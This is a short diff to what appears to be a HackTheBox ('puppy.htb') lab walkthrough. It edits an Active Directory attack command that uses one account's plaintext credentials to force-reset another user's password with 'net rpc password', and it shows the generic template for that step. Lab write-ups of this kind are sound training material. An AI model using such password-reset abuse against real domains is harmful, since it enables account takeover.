@@ -328,5 +328,6 @@ net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Pa
 ```
 End command
 ```bash
-net rpc password "ADAM.SILVER" "nopass@123" -U "puppy.htb"/"ANT.EDWARDS@PUPPY.HTB"%"Antman2025!" -S 10.10.11.70
+net rpc password "ADAM.SILVER" "nopass@123" -U "puppy.htb"/"ANT.EDWARDS"%"Antman2025!" -S 10.10.11.70
 ```
+Verify
